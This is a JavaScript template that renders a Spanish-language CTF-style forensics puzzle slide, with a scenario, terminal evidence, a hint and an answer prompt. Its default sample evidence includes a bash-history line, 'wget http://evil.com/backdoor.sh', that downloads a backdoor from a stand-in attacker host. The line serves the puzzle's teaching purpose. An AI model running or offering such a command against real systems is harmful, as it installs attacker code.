/**
 * KR-CLIDN-37: PUZZLE / CHALLENGE
 * CTF-style puzzle with terminal output and answer prompt.
 */
export function render(data) {
    const TemplateUtils = window.TemplateUtils;
    const esc = TemplateUtils.escapeHTML;

    const d = {
        CHALLENGE_NUM: data.CHALLENGE_NUM || '01',
        TITLE: data.TITLE || '¿Puedes encontrar la flag?',
        SCENARIO: data.SCENARIO || 'Tienes acceso SSH a un servidor comprometido. Encuentra la evidencia.',
        TERMINAL_LINES: data.TERMINAL_LINES || [
            { TYPE: 'prompt', TEXT: '$ find / -name "*.log" -newer /tmp/start 2>/dev/null' },
            { TYPE: 'output', TEXT: '/var/log/auth.log' },
            { TYPE: 'output', TEXT: '/home/admin/.bash_history' },
            { TYPE: 'prompt', TEXT: '$ cat /home/admin/.bash_history | tail -5' },
            { TYPE: 'output', TEXT: 'wget http://evil.com/backdoor.sh' }
        ],
        HINT: data.HINT || '💡 Analiza las conexiones salientes con netstat',
        DIFFICULTY: data.DIFFICULTY || 'MEDIO'
    };

    const colorMap = { prompt: 'var(--success-color)', output: '#aaa', error: 'var(--accent-color)', success: 'var(--success-color)' };
    const termLines = d.TERMINAL_LINES.map(l =>
        `<div style="font-size:38px; color:${colorMap[l.TYPE] || '#aaa'}; line-height:1.6; ${l.TYPE === 'prompt' ? 'font-weight:700;' : ''}">${esc(l.TEXT)}</div>`
    ).join('\n');

    const diffColor = d.DIFFICULTY === 'FÁCIL' ? 'var(--success-color)' : d.DIFFICULTY === 'DIFÍCIL' ? 'var(--accent-color)' : 'var(--warning-color)';

    return `<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>KR-CLIDN-37</title>
    <style>
        .puzzle-badge {
            display: inline-flex; align-items: center; gap: 10px;
            background: rgba(255,184,0,0.08); border: 1px solid rgba(255,184,0,0.2);
            border-radius: 8px; padding: 6px 14px;
        }
        .blink-cursor {
            display: inline-block; width: 12px; height: 24px;
            background: var(--primary-color); margin-left: 4px;
            animation: blink 1s step-end infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="bg-glow"></div>

    <div class="safe-zone">
        ${TemplateUtils.renderBrandHeader()}
        ${TemplateUtils.renderMetaBadge(data)}

        <!-- Header -->
        <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:8px;">
            <div class="puzzle-badge">
                <span style="font-size:38px;">🧩</span>
                <span class="mono" style="font-size:38px; color:var(--warning-color); letter-spacing:2px;">CHALLENGE #${esc(d.CHALLENGE_NUM)}</span>
            </div>
            <div class="mono" style="font-size:38px; color:${diffColor}; font-weight:700;">[${esc(d.DIFFICULTY)}]</div>
        </div>

        <h1 class="cyber-title" style="font-size:71px;">${TemplateUtils.renderEditable('TITLE', `${esc(d.TITLE)}`, data._overrides)}</h1>

        <!-- Scenario -->
        <div style="font-size:38px; color:#ccc; line-height:1.5; border-left:3px solid var(--warning-color); padding-left:14px; margin-bottom:8px;">
            ${esc(d.SCENARIO)}
        </div>

        <!-- Terminal Evidence -->
        <div class="terminal-window">
            <div class="term-header">
                <div class="term-dot red"></div>
                <div class="term-dot yellow"></div>
                <div class="term-dot green"></div>
                <span class="mono" style="font-size:38px; color:#888; margin-left:auto;">evidence.log</span>
            </div>
            <div class="term-body" style="padding:16px;">
                ${termLines}
            </div>
        </div>

        <!-- Hint -->
        <div class="glass-panel" style="display:flex; gap:12px; align-items:center; border-color:rgba(255,184,0,0.15);">
            <span style="font-size:38px; color:#ffffff; line-height:1.4;">${TemplateUtils.renderEditable('HINT', `${esc(d.HINT)}`, data._overrides)}</span>
        </div>

        <!-- Answer prompt -->
        <div class="mono" style="font-size:38px; color:#555; display:flex; align-items:center;">
            root@ctf:~$ <span class="blink-cursor"></span>
        </div>
    </div>

    ${TemplateUtils.getAutoFitScript()}
</body>
</html>`;
}
